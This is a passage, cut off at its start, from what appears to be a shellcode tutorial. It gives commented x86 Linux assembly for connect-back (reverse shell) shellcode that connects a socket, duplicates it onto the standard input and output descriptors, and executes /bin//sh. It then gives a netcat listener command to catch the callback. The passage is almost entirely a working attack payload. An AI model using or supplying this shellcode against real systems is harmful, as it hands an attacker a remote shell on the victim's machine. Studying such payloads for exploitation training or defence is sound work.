  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000003 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; Count down to 0.
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11.
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```
to catch the resulting callback you can use a program like netcat to set up a tcp listener with the following syntax
```
nc -v -l -p 31337
```